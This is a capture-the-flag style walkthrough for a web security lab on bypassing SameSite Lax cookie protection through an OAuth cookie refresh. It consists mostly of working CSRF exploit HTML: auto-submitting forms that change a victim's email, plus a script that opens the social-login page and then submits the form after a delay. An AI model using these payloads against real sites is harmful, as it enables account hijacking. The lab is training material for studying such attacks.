# SameSite Lax bypass via cookie refresh

## This lab's change email function is vulnerable to CSRF. To solve the lab, perform a [CSRF attack](https://portswigger.net/web-security/csrf) that changes the victim's email address. You should use the provided exploit server to host your attack.

## The lab supports OAuth-based login. You can log in via your social media account with the following credentials: `wiener:peter`

### HINT:

```html
<script>
  history.pushState("", "", "/");
</script>
<form
  action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"
  method="POST"
>
  <input type="hidden" name="email" value="foo@bar.com" />
  <input type="submit" value="Submit request" />
</form>
<script>
  document.forms[0].submit();
</script>
```

---

### step 1

use this stricpt store view expoit it will change email if you login and wait for 2 minute it will not change email so do within 2 minute

```html
<script>
  history.pushState("", "", "/");
</script>
<form
  action="https://0a05009904830764825ebf6c00de0053.web-security-academy.net/my-account/change-email"
  method="POST"
>
  <input type="hidden" name="email" value="foo1@bar.com" />
  <input type="submit" value="Submit request" />
</form>
<script>
  document.forms[0].submit();
</script>
```

### step2

### HINT:

```html
<form
  method="POST"
  action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"
>
  <input type="hidden" name="email" value="pwned@web-security-academy.net" />
</form>
<script>
  window.open("https://YOUR-LAB-ID.web-security-academy.net/social-login");
  setTimeout(changeEmail, 5000);

  function changeEmail() {
    document.forms[0].submit();
  }
</script>
```

change the script according to details with lab url
there is page `/social-login` it will rediredirect to login page this automatically initiates the full OAuth flow

```html
<form
  method="POST"
  action="https://0a05009904830764825ebf6c00de0053.web-security-academy.net/my-account/change-email"
>
  <input type="hidden" name="email" value="pwned@web-security-academy.net" />
</form>
<script>
  window.open(
    "https://0a05009904830764825ebf6c00de0053.web-security-academy.net/social-login"
  );
  setTimeout(changeEmail, 5000);

  function changeEmail() {
    document.forms[0].submit();
  }
</script>
```
